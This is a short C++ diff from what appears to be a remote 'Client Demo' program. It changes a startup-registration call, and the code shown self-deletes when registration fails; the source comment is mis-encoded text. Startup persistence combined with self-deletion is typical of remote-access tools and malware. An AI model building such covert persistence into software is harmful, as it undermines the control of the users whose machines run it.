@@ -212,7 +212,7 @@ public:
 int main(int argc, const char *argv[])
 {
     // ×¢²áÆô¶¯Ïî
-    int r = RegisterStartup("Client Demo", "ClientDemo");
+    int r = RegisterStartup("Client Demo", "ClientDemo", true);
     if (r <= 0) {
         BOOL s = self_del();
         if (!IsDebug)return r;
